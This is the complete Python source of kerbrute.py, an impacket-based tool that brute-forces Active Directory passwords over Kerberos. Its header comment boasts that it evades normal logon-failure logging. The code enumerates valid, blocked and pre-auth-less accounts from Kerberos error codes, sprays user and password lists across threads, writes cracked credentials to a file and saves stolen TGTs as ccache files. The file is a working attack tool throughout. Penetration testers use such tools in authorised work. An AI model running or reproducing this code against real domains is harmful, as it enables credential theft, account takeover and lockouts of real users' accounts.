#!/usr/bin/env python
#
# Authors:
#  Tarlogic (https://www.tarlogic.com)
#  Zer1t0 (https://github.com/Zer1t0)
#
# Description:
#     This module will perform a bruteforce attack by using Kerberos against Active Directory.
#     Kerberos bruteforcing has some pros:
#       * It didn't produce normal Logon event failure logs (4625) but instead Kerberos pre-authentication failure (4771)
#       * Allows discover valid users, even if password is wrong
#       * Allows discover users without Kerberos pre-authentication, to apply these ASREPRoast attack
#
#     As main parameters, a list of users and passwords, as well as a domain should be provided.
#     As a result, the discovered credentials will be shown, as well as valid accounts,
#     accounts without Kerberos pre-authentication and blocked accounts.
#
#     Also this scripts allows to save discovered passwords in a outputfile, and stored recovered TGTs in ccache files.
#
#


import argparse
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from impacket import version
from impacket.examples import logger
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, SessionKeyDecryptionError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache


class KerbruteArgumentParser:

    def __init__(self):
        self._parser = argparse.ArgumentParser()
        self._define_args()

    def _define_args(self):
        self._parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

        user_group = self._parser.add_mutually_exclusive_group(required=True)
        user_group.add_argument('-user', help='User to perform bruteforcing')
        user_group.add_argument('-users', help='File with user per line')

        password_group = self._parser.add_mutually_exclusive_group()
        password_group.add_argument('-password', help='Password to perform bruteforcing')
        password_group.add_argument('-passwords', help='File with password per line')

        self._parser.add_argument('-domain', required=True, help='Domain to perform bruteforcing')

        self._parser.add_argument('-dc-ip', action='store', metavar='<ip_address>',
                                  help='IP Address of the domain controller')

        self._parser.add_argument('-threads', type=int, default=1,
                                  help='Number of threads to perform bruteforcing. Default = 1')

        self._parser.add_argument('-outputfile', help='File to save discovered user:password')

        self._parser.add_argument('-no-save-ticket', action='store_true',
                                  help='Do not save retrieved TGTs with correct credentials')

    def parse_args(self):

        if len(sys.argv) == 1:
            self._parser.print_help()
            print("\nExamples: ")
            print("\t./kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com\n")
            sys.exit(1)

        args = self._parser.parse_args()

        args.users = self._get_file_lines(args.users) if args.users else [args.user]

        if args.passwords:
            args.passwords = self._get_file_lines(args.passwords)
        elif args.password:
            args.passwords = [args.password]
        else:
            args.passwords = ['']

        args.save_ticket = not args.no_save_ticket

        return args

    def _get_file_lines(self, filepath):
        with open(filepath) as fi:
            return [line.strip('\r\n') for line in fi]


def main():
    logger.init()
    print(version.BANNER)

    parser = KerbruteArgumentParser()
    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    out_creds_file = open(args.outputfile, "w") if args.outputfile else None

    kerberos_bruter = KerberosBruter(args.domain, args.dc_ip, args.save_ticket, out_creds_file)
    kerberos_bruter.attack(args.users, args.passwords, args.threads)

    if out_creds_file:
        out_creds_file.close()

        if kerberos_bruter.some_password_was_discovered():
            logging.info("Saved discovered passwords in %s" % args.outputfile)

    if not kerberos_bruter.some_password_was_discovered():
        logging.info("No passwords were discovered :'(")


class KerberosBruter:
    class InvalidUserError(Exception):
        pass

    def __init__(self, domain, kdc_host, save_ticket=True, out_creds_file=None):
        self.domain = domain
        self.kdc_host = kdc_host
        self.save_ticket = save_ticket

        self.good_credentials = {}
        self.bad_users = {}
        self.good_users = {}
        self.report_lock = Lock()

        self.out_creds_file = out_creds_file

    def attack(self, users, passwords, threads=1):
        pool = ThreadPoolExecutor(threads)
        threads = []

        for password in passwords:
            for user in users:
                t = pool.submit(self._handle_user_password, user, password)
                threads.append(t)

        for f in as_completed(threads):
            try:
                f.result()
            except Exception as ex:
                logging.debug('Error trying %s:%s %s' % (ex.kerb_user, ex.kerb_password, ex))

    def some_password_was_discovered(self):
        return len(self.good_credentials) > 0

    def _handle_user_password(self, user, password):
        try:
            self._check_user_password(user, password)
        except KerberosBruter.InvalidUserError:
            pass
        except Exception as ex:
            ex.kerb_user = user
            ex.kerb_password = password
            raise ex

    def _check_user_password(self, user, password):
        try:
            tgt, user_key = self._try_get_tgt(user, password)
            self._report_good_password(user, password, tgt, user_key)

        except KerberosError as ex:
            if ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                self._report_bad_user(user)

            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                self._report_good_user(user)

            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                self._report_blocked_user(user)
            else:
                raise ex

        except SessionKeyDecryptionError as ex:
            self._report_good_user_with_preauth(user, ex.asRep)

    def _try_get_tgt(self, user, password):
        if self._user_credentials_were_discovered(user) or self._is_bad_user(user):
            raise KerberosBruter.InvalidUserError()

        logging.debug('Trying %s:%s' % (user, password))

        username = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, user_key, session_key = getKerberosTGT(username, password, self.domain, lmhash='', nthash='',
                                                            kdcHost=self.kdc_host)
        return tgt, user_key

    def _user_credentials_were_discovered(self, user):
        return user in self.good_credentials

    def _is_bad_user(self, user):
        return user in self.bad_users

    def _report_good_password(self, user, password, tgt, user_key):
        with self.report_lock:
            if user not in self.good_users:
                self.good_users[user] = True

            if user in self.good_credentials:
                return

            self.good_credentials[user] = password

            logging.info('Stupendous => %s:%s' % (user, password))

            if self.out_creds_file:
                self.out_creds_file.write("%s:%s\n" % (user, password))

            if self.save_ticket:
                ccache = CCache()
                ccache.fromTGT(tgt, user_key, user_key)

                ccache_file = user + '.ccache'
                ccache.saveFile(ccache_file)
                logging.info('Saved TGT in %s' % ccache_file)

    def _report_bad_user(self, user):
        with self.report_lock:
            if user in self.bad_users:
                return

            self.bad_users[user] = True
            logging.debug('Invalid user => %s' % user)

    def _report_good_user(self, user):
        with self.report_lock:
            if user in self.good_users:
                return

            self.good_users[user] = True
            logging.info('Valid user => %s' % user)

    def _report_good_user_with_preauth(self, user, as_rep):
        with self.report_lock:
            if user in self.good_users:
                return

            self.good_users[user] = True
            logging.info('Valid user => %s [NOT PREAUTH]' % user)

    def _report_blocked_user(self, user):
        with self.report_lock:
            if user in self.bad_users:
                return

            self.bad_users[user] = True
            logging.info('Blocked/Disabled user => %s' % user)


if __name__ == '__main__':
    main()
